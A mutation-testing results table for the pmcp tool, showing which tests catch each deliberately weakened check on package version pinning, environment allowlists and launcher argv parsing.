| M3 | existing tag not replaced | `loader.py:692c692` | **7 failed, 223 passed** (restored=True) | `AssertionError: assert ['-y', '@play...latest@1.2.3'] == ['-y', '@play...ht/mcp@1.2.3']`; `test_version_pins_every_plain_registry_class[@s/p@latest-@s/p@3.25.5]`, `test_version_pins_every_plain_registry_class[t@1.0.0-rc.1-t@3.25.5]`, `test_version_pins_every_plain_registry_class[t@1.0.0-t@3.25.5]`, `test_version_pins_every_plain_registry_class[t@beta-2.tgzx-t@3.25.5]`, `test_version_pins_every_plain_registry_class[t@next-t@3.25.5]`, `test_version_replaces_a_dist_tag_slot`, `test_version_replaces_an_existing_tag_on_a_scoped_package` |
| M4 | servers: version: key ignored | `loader.py:867c867` | **52 failed, 178 passed** (restored=True) | `AssertionError: assert ['-y', 'custo...port', '3000'] == ['-y', 'custo...port', '3000']`; `test_a_pin_on_a_malformed_entry_costs_only_that_entry[command: "npx"\n    args: ["-y", "ok-mcp"]\n    install:\n      linux: ["npx", "-y", 123]]`, `test_a_pin_on_a_malformed_entry_costs_only_that_entry[command: "npx"\n    args: ["-y", 123]]`, `test_a_pin_on_a_malformed_entry_costs_only_that_entry[command: 123\n    args: ["-y", "ok-mcp"]]`, `test_version_key_on_a_whole_servers_entry_is_materialised`, `test_version_pins_every_plain_registry_class[@s/p-@s/p@3.25.5]`, `test_version_pins_every_plain_registry_class[@s/p.tgz-@s/p.tgz@3.25.5]`, `test_version_pins_every_plain_registry_class[@s/p@latest-@s/p@3.25.5]`, `test_version_pins_every_plain_registry_class[t-t@3.25.5]`, `test_version_pins_every_plain_registry_class[t@1.0.0-rc.1-t@3.25.5]`, `test_version_pins_every_plain_registry_class[t@1.0.0-t@3.25.5]` (+42 more) |
| M5 | unapproved project overlay applied | `loader.py:1142c1142` | **2 failed, 228 passed** (restored=True) | `AssertionError: assert '3.25.5' is None`; `test_fingerprint_changes_when_the_project_overlay_is_approved`, `test_unapproved_project_server_version_contributes_nothing` |
| M6 | non-npx command accepted | `loader.py:720c720` | **2 failed, 228 passed** (restored=True) | `assert False`; `test_a_pin_on_a_malformed_entry_costs_only_that_entry[command: 123\n    args: ["-y", "ok-mcp"]]`, `test_version_on_a_uvx_server_is_refused_with_the_escape_hatch` |
| M7 | install may name another package | `loader.py:742c742` | **1 failed, 229 passed** (restored=True) | `AssertionError: assert '1.0.0' is None`; `test_version_is_refused_when_an_install_argv_names_another_package` |
| M8 | comparison arguments swapped | `handlers.py:6006c6006` | **2 failed, 228 passed** (restored=True) | `AssertionError: assert 'not_newer' == 'newer'`; `test_update_server_labels_build_metadata_with_what_npm_runs`, `test_update_server_reports_a_newer_version_for_a_pinned_server` |
| M9 | relaxer not required for the warning | `handlers.py:1208,1209d1207` | **1 failed, 229 passed** (restored=True) | `assert ["'fc' talks ...nifest.yaml."] == []`; `test_health_is_silent_when_the_relaxer_is_not_active` |
| M10 | pin not consulted for the warning | `handlers.py:1271c1271` | **17 failed, 213 passed** (restored=True) | `assert 'unpinned' in "'fc' talks to a self-hosted backend (SELFHOST_API_URL is set), but pmcp cannot verify that its client is pinned: the ...which can change w`; `test_a_uvx_url_requirement_is_never_an_exact_pin`, `test_docker_digest_labels_and_the_entrys_docker_env`, `test_health_still_warns_when_npm_identity_is_disabled`, `test_health_warns_on_a_docker_tag_however_version_like`, `test_health_warns_on_a_range_or_dist_tag[fc-mcp@3.x]`, `test_health_warns_on_a_range_or_dist_tag[fc-mcp@^3.25.5]`, `test_health_warns_on_a_range_or_dist_tag[fc-mcp@next]`, `test_health_warns_on_a_range_or_dist_tag[fc-mcp@~3.25.5]`, `test_health_warns_when_a_self_hosted_backend_client_is_unpinned`, `test_the_cause_names_a_launcher_identity_does_not_read[abs-npx-active (npm 11.19.0)]` (+7 more) |
| M11 | health judges the manifest, not the connected config | `handlers.py:3202c3202` | **5 failed, 225 passed** (restored=True) | `assert ["'fc' talks ...nifest.yaml."] == []`; `test_a_docker_digest_ignores_an_entry_set_cwd_and_an_inherited_cwd_is_the_hosts`, `test_an_entry_set_cwd_makes_an_exact_pin_unverifiable[cargo]`, `test_an_entry_set_cwd_makes_an_exact_pin_unverifiable[npx]`, `test_an_entry_set_cwd_makes_an_exact_pin_unverifiable[uvx]`, `test_health_judges_the_configured_entry_not_the_manifest` |
| M12 | update_server drops the warning | `handlers.py:5850,5851d5849` | **1 failed, 229 passed** (restored=True) | `AssertionError: assert 0 == 1`; `test_update_server_carries_the_unpinned_self_hosted_warning` |
| M13 | CLI keys the status off ok | `cli.py:1033c1033` | **2 failed, 228 passed** (restored=True) | `assert False`; `test_pmcp_update_renders_a_pinned_server_as_pinned_not_failed`, `test_update_server_reports_a_docker_tag_as_floating` |
| M14 | health never attaches warnings | `handlers.py:3126d3125` | **91 failed, 139 passed** (restored=True) | `AssertionError: assert 0 == 1`; `test_a_uvx_url_requirement_is_never_an_exact_pin`, `test_an_argv_pmcp_cannot_read_fails_loud_for_every_read_launcher[docker-unknown-flag]`, `test_an_argv_pmcp_cannot_read_fails_loud_for_every_read_launcher[uvx-non-bare]`, `test_an_argv_pmcp_cannot_read_fails_loud_for_every_read_launcher[uvx-unknown-flag]`, `test_an_entry_key_not_proven_inert_is_unverifiable[empty-path]`, `test_an_entry_key_not_proven_inert_is_unverifiable[ld-preload]`, `test_an_entry_key_not_proven_inert_is_unverifiable[unknown-key]`, `test_an_entry_key_not_proven_inert_is_unverifiable[xdg-cache-home]`, `test_an_entry_key_not_proven_inert_is_unverifiable[xdg-config-dirs]`, `test_an_entry_set_cwd_makes_an_exact_pin_unverifiable[cargo]` (+81 more) |
| M15 | P1: any selector accepted (alias/url/git/file/dir/range) | `loader.py:666c666` | **21 failed, 209 passed** (restored=True) | `AssertionError: assert ('myalias', 'npm:firecrawl-mcp@3.25.5') is None`; `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[absolute-dir]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[alias]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[file-prefix]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[git-ssh]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[git-url]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[home-dir]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[hosted-path]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[hosted-shortcut]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[not-uri-safe-tag]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[oversized-core-is-a-tag]` (+11 more) |
| M16 | P1: dist-tag slots refused | `loader.py:662c662` | **5 failed, 225 passed** (restored=True) | `AssertionError: assert ['-y', '@play...t/mcp@latest'] == ['-y', '@play...ht/mcp@1.2.3']`; `test_version_pins_every_plain_registry_class[@s/p@latest-@s/p@3.25.5]`, `test_version_pins_every_plain_registry_class[t@beta-2.tgzx-t@3.25.5]`, `test_version_pins_every_plain_registry_class[t@next-t@3.25.5]`, `test_version_replaces_a_dist_tag_slot`, `test_version_replaces_an_existing_tag_on_a_scoped_package` |
| M17 | P2: any npm selector counts as exact | `handlers.py:494c494` | **6 failed, 224 passed** (restored=True) | `assert 'floats on' in "'fc' talks to a self-hosted backend (SELFHOST_API_URL is set), but pmcp cannot verify that its client is pinned: the ...which can change `; `test_a_tarball_shaped_version_is_never_an_exact_pin`, `test_health_warns_on_a_range_or_dist_tag[fc-mcp@3.x]`, `test_health_warns_on_a_range_or_dist_tag[fc-mcp@^3.25.5]`, `test_health_warns_on_a_range_or_dist_tag[fc-mcp@next]`, `test_health_warns_on_a_range_or_dist_tag[fc-mcp@~3.25.5]`, `test_the_floating_label_claims_only_what_every_npm_reads` |
| M18 | P2: update reports a range as pinned | `handlers.py:5964c5964` | **1 failed, 229 passed** (restored=True) | `assert 'a docker tag' in "'dk' is held at '3.25.5' in the manifest entry (docker run --pull=always example/client:3.25.5). '3.25.5' does not ho..._server will n`; `test_update_server_reports_a_docker_tag_as_floating` |
| M19 | P3: materialisation not contained per entry | `loader.py:1211c1211` | **1 failed, 229 passed** (restored=True) | `TypeError: expected str, bytes or os.PathLike object, not int`; `test_a_pin_on_a_malformed_entry_costs_only_that_entry[command: 123\n    args: ["-y", "ok-mcp"]]` |
| M20 | F2: inherited env ignored | `handlers.py:1206c1206` | **1 failed, 229 passed** (restored=True) | `AssertionError: assert 0 == 1`; `test_health_warns_when_the_relaxer_comes_from_the_gateway_environment` |
| M21 | F3: no cache | `handlers.py:3175c3175` | **1 failed, 229 passed** (restored=True) | `assert 3 == 1`; `test_health_loads_the_manifest_once_until_a_source_changes` |
| M22 | F3: fingerprint misses the user overlay | `loader.py:792d791` | **1 failed, 229 passed** (restored=True) | `assert 1 == 2`; `test_health_loads_the_manifest_once_until_a_source_changes` |
| M23 | N2: build metadata accepted | `loader.py:583c583` | **1 failed, 229 passed** (restored=True) | `AssertionError: assert '3.25.5+evil' is None`; `test_server_version_refuses_anything_but_one_exact_version["3.25.5+evil"]` |
| M24 | CLI labels a range [FAILED] | `cli.py:1027c1027` | **4 failed, 226 passed** (restored=True) | `assert False`; `test_pmcp_update_renders_a_range_as_floating`, `test_update_server_never_labels_a_container_command_pinned`, `test_update_server_never_labels_a_divergent_install_argv_pinned`, `test_update_server_reports_a_docker_tag_as_floating` |
| M25 | B1: selector file check removed from split | `loader.py:658,659d657` | **3 failed, 227 passed** (restored=True) | `AssertionError: assert ('t', 'corp.tgz') is None`; `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[tarball-TGZ-mixed]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[tarball-npm10-tar-gz]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[tarball-tgz]` |
| M26 | B1: bare-tarball / tarball-NAME slot accepted | `loader.py:650,651d649` | **3 failed, 227 passed** (restored=True) | `AssertionError: assert ('corp.tgz', None) is None`; `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[bare-tarball-TAR]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[bare-tarball-tgz]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[tarball-name-with-version]` |
| M27 | N4: x/X/v1.2.x range words accepted as tags | `loader.py:662,664c662` | **7 failed, 223 passed** (restored=True) | `AssertionError: assert ('t', 'x') is None`; `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[range-X]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[range-v-partial]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[range-v-xbeta]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[range-vvX]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[range-vv]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[range-x]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[version-vv]` |
| M28 | N4: match instead of fullmatch (trailing newline) | `loader.py:662c662` | **8 failed, 222 passed** (restored=True) | `AssertionError: assert ('myalias', 'npm:firecrawl-mcp@3.25.5') is None`; `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[alias]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[file-prefix]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[git-ssh]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[git-url]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[hosted-path]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[hosted-shortcut]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[not-uri-safe-tag]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[tag-trailing-newline]` |
| M29 | N2: silent when npm identity is disabled | `handlers.py:1245,1246c1245` | **23 failed, 207 passed** (restored=True) | `AssertionError: assert 0 == 1`; `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-cache]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-call]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-extra-ca]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-home]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-https-proxy-lower]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-https-proxy]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-node-options]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-package]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-registry-uppercase]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-tag]` (+13 more) |
| M30 | N2: silent when the slot cannot be read either | `handlers.py:1253a1254` | **5 failed, 225 passed** (restored=True) | `AssertionError: assert 0 == 1`; `test_health_fails_loud_for_an_npm_exec_launch_without_identity`, `test_health_says_it_cannot_verify_an_unreadable_slot_without_identity`, `test_health_warns_on_a_semver_tarball_argv_in_both_identity_modes`, `test_the_cause_names_a_launcher_identity_does_not_read[npm.cmd-active (npm 11.19.0)]`, `test_the_cause_names_a_launcher_identity_does_not_read[npm.cmd-not started (test)]` |
| M31 | N3: label keeps +metadata | `handlers.py:6000c6000` | **1 failed, 229 passed** (restored=True) | `AssertionError: assert ('3.25.5+evil', 'newer') == ('3.25.5', 'newer')`; `test_update_server_labels_build_metadata_with_what_npm_runs` |
| M32 | N1: fingerprint misses the project overlay | `loader.py:795c795` | **1 failed, 229 passed** (restored=True) | `AssertionError: assert (('/mnt/workspace/worktrees/viperjuice/pmcp-294-rev9-spike/src/pmcp/manifest/manifest.yaml', 1790487765550327522, 7826...', None, None), `; `test_fingerprint_changes_when_a_project_overlay_appears` |
| M33 | N1: fingerprint misses the trust store | `loader.py:801c801` | **1 failed, 229 passed** (restored=True) | `AssertionError: assert (('/mnt/workspace/worktrees/viperjuice/pmcp-294-rev9-spike/src/pmcp/manifest/manifest.yaml', 1790487765550327522, 7826...viperjuice/pytes`; `test_fingerprint_changes_when_the_project_overlay_is_approved` |
| M34 | B1': pin value checked with the bare SemVer grammar instead of main's npm-aware is_valid_package_version | `loader.py:583c583 loader.py:17a18` | **7 failed, 223 passed** (restored=True) | `AssertionError: assert '3.25.5-evil.tgz' is None`; `test_a_tarball_shaped_version_is_never_an_exact_pin`, `test_server_version_refuses_anything_but_one_exact_version["1.0.0-a.tar.gz"]`, `test_server_version_refuses_anything_but_one_exact_version["1.0.0-x.TAR"]`, `test_server_version_refuses_anything_but_one_exact_version["1.0.0-x.tar-gz"]`, `test_server_version_refuses_anything_but_one_exact_version["1.2.3-X.Tar.Gz"]`, `test_server_version_refuses_anything_but_one_exact_version["3.25.5-evil.tgz"]`, `test_server_version_refuses_anything_but_one_exact_version["9007199254740992.0.0"]` |
| M35 | B1': the REV-3 ORDER restored in the split (bare SemVer accepted before the file check) | `loader.py:657a658,659 loader.py:17a18` | **7 failed, 223 passed** (restored=True) | `AssertionError: assert ('firecrawl-mcp', '3.25.5-corp.tgz') is None`; `test_health_warns_on_a_semver_tarball_argv_in_both_identity_modes`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[oversized-core-is-a-tag]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[semver-tarball-TAR]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[semver-tarball-build]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[semver-tarball-npm10-tar-gz]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[semver-tarball-prerelease]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[semver-tarball-scoped]` |
| M40 | B1': _is_exact_pin trusts the bare SemVer grammar | `handlers.py:494c494 handlers.py:70a71` | **2 failed, 228 passed** (restored=True) | `AssertionError: assert True is False`; `test_a_tarball_shaped_version_is_never_an_exact_pin`, `test_the_floating_label_claims_only_what_every_npm_reads` |
| M36 | N-c: excluded names accepted | `loader.py:652,653d651` | **3 failed, 227 passed** (restored=True) | `AssertionError: assert ('node_modules', None) is None`; `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[excluded-Node_Modules-versioned]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[excluded-favicon]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[excluded-node_modules]` |
| M37 | N-a: only one leading v | `loader.py:625c625` | **3 failed, 227 passed** (restored=True) | `AssertionError: assert ('t', 'vv1') is None`; `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[range-vvX]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[range-vv]`, `test_version_refuses_a_slot_that_is_not_a_plain_registry_spec[version-vv]` |
| M38 | N-b: npm exec silent | `handlers.py:1245c1245` | **3 failed, 227 passed** (restored=True) | `AssertionError: assert 0 == 1`; `test_health_fails_loud_for_an_npm_exec_launch_without_identity`, `test_the_cause_names_a_launcher_identity_does_not_read[npm.cmd-active (npm 11.19.0)]`, `test_the_cause_names_a_launcher_identity_does_not_read[npm.cmd-not started (test)]` |
| M39 | N-d: cause always 'unavailable' | `handlers.py:1043c1043` | **1 failed, 229 passed** (restored=True) | `assert "npm's own parser did not identify" in "'fc' talks to a self-hosted backend (SELFHOST_API_URL is set), but pmcp cannot verify that its client is pinned: `; `test_health_warns_on_a_semver_tarball_argv_in_both_identity_modes` |
| M43 | C2: the generic SemVer check restored ahead of the launcher branches | `handlers.py:492a493,494` | **3 failed, 227 passed** (restored=True) | `AssertionError: assert True is False`; `test_exactness_is_decided_per_launcher`, `test_health_warns_on_a_docker_tag_however_version_like`, `test_update_server_reports_a_docker_tag_as_floating` |
| M44 | NB-1: cause keyed on the resolver status again | `handlers.py:1037c1037` | **8 failed, 222 passed** (restored=True) | `assert 'reads only a bare 'npx'/'npm' command' in "'fc' talks to a self-hosted backend (SELFHOST_API_URL is set) but its client npm:fc-mcp is unpinned (read fro`; `test_the_cause_names_a_launcher_identity_does_not_read[abs-npx-active (npm 11.19.0)]`, `test_the_cause_names_a_launcher_identity_does_not_read[abs-npx-not started (test)]`, `test_the_cause_names_a_launcher_identity_does_not_read[npm.cmd-active (npm 11.19.0)]`, `test_the_cause_names_a_launcher_identity_does_not_read[npm.cmd-not started (test)]`, `test_the_cause_names_a_launcher_identity_does_not_read[npx.cmd-active (npm 11.19.0)]`, `test_the_cause_names_a_launcher_identity_does_not_read[npx.cmd-not started (test)]`, `test_the_cause_names_a_launcher_identity_does_not_read[windows-npx-active (npm 11.19.0)]`, `test_the_cause_names_a_launcher_identity_does_not_read[windows-npx-not started (test)]` |
| M51 | C1: a matching @scope:registry counted harmless | `handlers.py:714c714` | **1 failed, 229 passed** (restored=True) | `AssertionError: npm_config_@corp:registry`; `test_the_entry_env_allowlist` |
| M52 | NB-2: the old floating label | `handlers.py:563c563` | **1 failed, 229 passed** (restored=True) | `assert 'not one exact version on every npm release' in "'fc' talks to a self-hosted backend (SELFHOST_API_URL is set) but its client npm:fc-mcp floats on '1.0.0`; `test_the_floating_label_claims_only_what_every_npm_reads` |
| M53 | C2: any sha256: prefix counted a digest | `handlers.py:496c496` | **2 failed, 228 passed** (restored=True) | `AssertionError: assert True is False`; `test_docker_digest_labels_and_the_entrys_docker_env`, `test_exactness_is_decided_per_launcher` |
| M57 | C1/B2: an exact argv suppresses whatever the entry sets | `handlers.py:1275,1277c1275` | **28 failed, 202 passed** (restored=True) | `assert 0 == 1`; `test_an_entry_key_not_proven_inert_is_unverifiable[empty-path]`, `test_an_entry_key_not_proven_inert_is_unverifiable[ld-preload]`, `test_an_entry_key_not_proven_inert_is_unverifiable[unknown-key]`, `test_an_entry_key_not_proven_inert_is_unverifiable[xdg-cache-home]`, `test_an_entry_key_not_proven_inert_is_unverifiable[xdg-config-dirs]`, `test_an_entry_set_cwd_makes_an_exact_pin_unverifiable[cargo]`, `test_an_entry_set_cwd_makes_an_exact_pin_unverifiable[npx]`, `test_an_entry_set_cwd_makes_an_exact_pin_unverifiable[uvx]`, `test_an_exact_cargo_pin_is_not_called_pinned_when_the_entry_redirects_cargo[argv-git]`, `test_an_exact_cargo_pin_is_not_called_pinned_when_the_entry_redirects_cargo[argv-registry]` (+18 more) |
| M66 | N5: a uvx URL requirement counted exact | `handlers.py:526c526` | **1 failed, 229 passed** (restored=True) | `AssertionError: assert True is False`; `test_a_uvx_url_requirement_is_never_an_exact_pin` |
| M67 | N5: an unreadable docker/uvx argv silent | `handlers.py:1228c1228` | **3 failed, 227 passed** (restored=True) | `assert 0 == 1`; `test_an_argv_pmcp_cannot_read_fails_loud_for_every_read_launcher[docker-unknown-flag]`, `test_an_argv_pmcp_cannot_read_fails_loud_for_every_read_launcher[uvx-non-bare]`, `test_an_argv_pmcp_cannot_read_fails_loud_for_every_read_launcher[uvx-unknown-flag]` |
| M68 | trust boundary: the HOST environment judged too | `handlers.py:1276c1276` | **79 failed, 151 passed** (restored=True) | `assert ["'fc' talks ...ned version."] == []`; `test_a_docker_digest_ignores_an_entry_set_cwd_and_an_inherited_cwd_is_the_hosts`, `test_a_recognised_shape_with_an_exact_pin_is_silent[cargo]`, `test_a_recognised_shape_with_an_exact_pin_is_silent[docker-digest]`, `test_a_recognised_shape_with_an_exact_pin_is_silent[docker-tagged-digest]`, `test_a_recognised_shape_with_an_exact_pin_is_silent[npx]`, `test_a_recognised_shape_with_an_exact_pin_is_silent[uvx-from-own-command]`, `test_a_recognised_shape_with_an_exact_pin_is_silent[uvx-pep503-name]`, `test_an_entry_key_not_proven_inert_is_unverifiable[empty-path]`, `test_an_entry_key_not_proven_inert_is_unverifiable[ld-preload]`, `test_an_entry_key_not_proven_inert_is_unverifiable[unknown-key]` (+69 more) |
| M69 | N5: a malformed digest labelled a tag | `handlers.py:550c550` | **1 failed, 229 passed** (restored=True) | `assert 'a malformed content digest' in "'du' talks to a self-hosted backend (SELFHOST_API_URL is set) but its client docker:example/client floats on 'sha256:...`; `test_docker_digest_labels_and_the_entrys_docker_env` |
| M72 | cwd: an entry-set cwd ignored | `handlers.py:1011c1011` | **3 failed, 227 passed** (restored=True) | `AssertionError: assert 0 == 1`; `test_an_entry_set_cwd_makes_an_exact_pin_unverifiable[cargo]`, `test_an_entry_set_cwd_makes_an_exact_pin_unverifiable[npx]`, `test_an_entry_set_cwd_makes_an_exact_pin_unverifiable[uvx]` |
| M73 | cwd: docker counted cwd-sensitive | `handlers.py:1021c1021` | **1 failed, 229 passed** (restored=True) | `assert False`; `test_a_docker_digest_ignores_an_entry_set_cwd_and_an_inherited_cwd_is_the_hosts` |
| M74 | cwd: the inherited (host) cwd judged too | `handlers.py:1276c1276` | **39 failed, 191 passed** (restored=True) | `assert ["'fc' talks ...ned version."] == []`; `test_a_docker_digest_ignores_an_entry_set_cwd_and_an_inherited_cwd_is_the_hosts`, `test_a_recognised_shape_with_an_exact_pin_is_silent[cargo]`, `test_a_recognised_shape_with_an_exact_pin_is_silent[npx]`, `test_a_recognised_shape_with_an_exact_pin_is_silent[uvx-from-own-command]`, `test_a_recognised_shape_with_an_exact_pin_is_silent[uvx-pep503-name]`, `test_an_exact_cargo_pin_is_silent_without_an_entry_redirect`, `test_an_exact_uvx_pin_is_silent_without_an_entry_redirect`, `test_an_install_argv_that_does_not_run_the_pin_is_unverifiable[other-version]`, `test_an_install_argv_that_does_not_run_the_pin_is_unverifiable[package-then-sh]`, `test_an_install_argv_that_does_not_run_the_pin_is_unverifiable[sh-wrapper]` (+29 more) |
| M75 | ENV allowlist: an unknown key counted inert | `handlers.py:745c745` | **16 failed, 214 passed** (restored=True) | `AssertionError: assert 0 == 1`; `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-extra-ca]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-home]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-https-proxy-lower]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-https-proxy]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-node-options]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-on-entry-extra-ca]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-on-entry-home]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-on-entry-https-proxy-lower]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-on-entry-https-proxy]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-on-entry-node-options]` (+6 more) |
| M77 | ENV: the server's declared keys not inert | `handlers.py:730,731d729` | **69 failed, 161 passed** (restored=True) | `AssertionError: assert (None, '3.26.0') == ('3.25.5', '3.26.0')`; `test_a_docker_digest_ignores_an_entry_set_cwd_and_an_inherited_cwd_is_the_hosts`, `test_a_recognised_shape_with_an_exact_pin_is_silent[cargo]`, `test_a_recognised_shape_with_an_exact_pin_is_silent[docker-digest]`, `test_a_recognised_shape_with_an_exact_pin_is_silent[docker-tagged-digest]`, `test_a_recognised_shape_with_an_exact_pin_is_silent[npx]`, `test_a_recognised_shape_with_an_exact_pin_is_silent[uvx-from-own-command]`, `test_a_recognised_shape_with_an_exact_pin_is_silent[uvx-pep503-name]`, `test_an_entry_key_not_proven_inert_is_unverifiable[unknown-key]`, `test_an_entry_key_not_proven_inert_is_unverifiable[xdg-cache-home]`, `test_an_entry_key_not_proven_inert_is_unverifiable[xdg-config-dirs]` (+59 more) |
| M78 | ENV: locale/terminal keys not inert | `handlers.py:733c733` | **3 failed, 227 passed** (restored=True) | `assert ["'fc' talks ...ned version."] == []`; `test_entry_settings_that_cannot_redirect_keep_an_exact_pin_silent[identity-off]`, `test_entry_settings_that_cannot_redirect_keep_an_exact_pin_silent[identity-on]`, `test_the_entry_env_allowlist` |
| M79 | ENV: every npm_config_* key counted inert | `handlers.py:736c736` | **13 failed, 217 passed** (restored=True) | `AssertionError: assert 0 == 1`; `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-cache]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-call]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-package]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-registry-uppercase]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-tag]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-userconfig]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-on-entry-cache]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-on-entry-call]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-on-entry-package]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-on-entry-registry-uppercase]` (+3 more) |
| M80 | ENV: every key counted inert for uv | `handlers.py:738c738` | **9 failed, 221 passed** (restored=True) | `AssertionError: UV_OVERRIDE`; `test_an_entry_key_not_proven_inert_is_unverifiable[empty-path]`, `test_an_entry_key_not_proven_inert_is_unverifiable[ld-preload]`, `test_an_entry_key_not_proven_inert_is_unverifiable[unknown-key]`, `test_an_entry_key_not_proven_inert_is_unverifiable[xdg-cache-home]`, `test_an_entry_key_not_proven_inert_is_unverifiable[xdg-config-dirs]`, `test_an_exact_uvx_pin_is_not_called_pinned_when_the_entry_redirects_uv[env-index]`, `test_an_exact_uvx_pin_is_not_called_pinned_when_the_entry_redirects_uv[env-override]`, `test_an_exact_uvx_pin_is_not_called_pinned_when_the_entry_redirects_uv[env-xdg]`, `test_the_entry_env_allowlist` |
| M81 | ENV: every key counted inert for cargo | `handlers.py:742c742` | **3 failed, 227 passed** (restored=True) | `AssertionError: CARGO_HOME`; `test_an_exact_cargo_pin_is_not_called_pinned_when_the_entry_redirects_cargo[env-registry-index]`, `test_an_exact_cargo_pin_is_not_called_pinned_when_the_entry_redirects_cargo[env-rustc-wrapper]`, `test_the_entry_env_allowlist` |
| M82 | SHAPE npx: an unknown flag counted inert | `handlers.py:795c795` | **2 failed, 228 passed** (restored=True) | `assert 0 == 1`; `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[npx-package-then-sh]`, `test_an_install_argv_that_does_not_run_the_pin_is_unverifiable[package-then-sh]` |
| M84 | SHAPE uvx: an unknown flag counted inert | `handlers.py:833c833` | **4 failed, 226 passed** (restored=True) | `assert 0 == 1`; `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[uvx-python]`, `test_an_exact_uvx_pin_is_not_called_pinned_when_the_entry_redirects_uv[argv-index]`, `test_an_exact_uvx_pin_is_not_called_pinned_when_the_entry_redirects_uv[argv-overrides]`, `test_an_exact_uvx_pin_is_not_called_pinned_when_the_entry_redirects_uv[argv-with]` |
| M85 | SHAPE uvx: --from with another command counted the package | `handlers.py:842c842` | **1 failed, 229 passed** (restored=True) | `assert 0 == 1`; `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[uvx-from-then-sh]` |
